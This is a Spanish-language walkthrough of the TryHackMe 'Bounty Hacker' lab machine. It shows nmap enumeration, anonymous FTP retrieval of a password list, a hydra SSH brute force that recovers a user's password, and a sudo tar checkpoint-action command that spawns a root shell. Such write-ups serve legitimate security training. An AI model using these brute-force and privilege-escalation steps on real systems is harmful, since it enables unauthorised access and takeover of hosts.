# Resolución de la Máquina: Bounty Hacker

- **Plataforma:** TryHackMe
- **Dificultad:** Fácil
- **Fecha de resolución:** 23/06/2025
- **Sistema Operativo:** Linux


## Descripción
"Bounty Hacker" es una máquina de nivel fácil alojada en TryHackMe, ideal para principiantes en el hacking ético y resolución de CTFs. Simula un entorno realista en el que se deben explotar servicios comunes con configuraciones débiles para lograr el acceso inicial, y luego realizar una escalada de privilegios sencilla para comprometer completamente el sistema.

La máquina representa un escenario típico donde un atacante aprovecha credenciales filtradas o débilmente protegidas para comprometer un sistema remoto.

Esta máquina es especialmente útil para:

> Practicar la enumeración de servicios expuestos y banners con herramientas como Nmap

> Conectarse a través de SSH usando claves privadas (id_rsa) encontradas durante la fase de reconocimiento

> Reforzar habilidades de análisis de archivos locales y búsqueda de flags

> Aplicar técnicas básicas de escalada de privilegios en sistemas Linux a partir de binarios con permisos inseguros o configuraciones débiles

## Enumeración

### Escaneo con Nmap

```bash
└─$ nmap --open -T5 -sS -n -Pn -sV 10.10.97.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 13:30 CEST
Nmap scan report for 10.10.97.62
Host is up (0.049s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```
## Intrusión
Encontraremos un servidor FTP al que podremos acceder con usuario anonymous, eso si, deberemos desactivar el modo pasivo. Una vez conectados haremos un get de los dos archivos del FTP.

```bash
└─$ ftp 10.10.97.62
Connected to 10.10.97.62.
220 (vsFTPd 3.0.3)
Name (10.10.97.62:yeray): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt 
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************************************************************************************************************************************************************************|   418        2.75 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.09 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************************************************************************************************************************************************************************|    68       28.01 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.35 KiB/s)
```

El contenido de los ficheros es el siguiente:
```bash
└─$ cat locks.txt                                      
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
```bash
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
Si pasamos un hydra hacia lin con las contraseñas vistas podremos encontrar su contraseña
```bash
└─$ hydra -V -t 4 -l lin -P locks.txt ssh://10.10.97.62
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-23 14:02:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.97.62:22/
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 2] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 3] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 2] (0/0)
[ATTEMPT] target 10.10.97.62 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 3] (0/0)
[22][ssh] host: 10.10.97.62   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-23 14:02:46
```
```bash
└─$ ssh lin@10.10.97.62
The authenticity of host '10.10.97.62 (10.10.97.62)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.97.62' (ED25519) to the list of known hosts.
lin@10.10.97.62's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 
```
##Escalada de privilegios
Si hacemos un sudo -l veremos la siguiente salida
```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
En GTFOBins encontraremos la manera de poder escalar privilegios mediante este binario sobre el cual tenemos permiso de sudo.

```bash
lin@bountyhacker:~$ sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/tar: Removing leading `/' from member names
# whoami
root
```
Encontraremos el flag de root en /root/root.txt
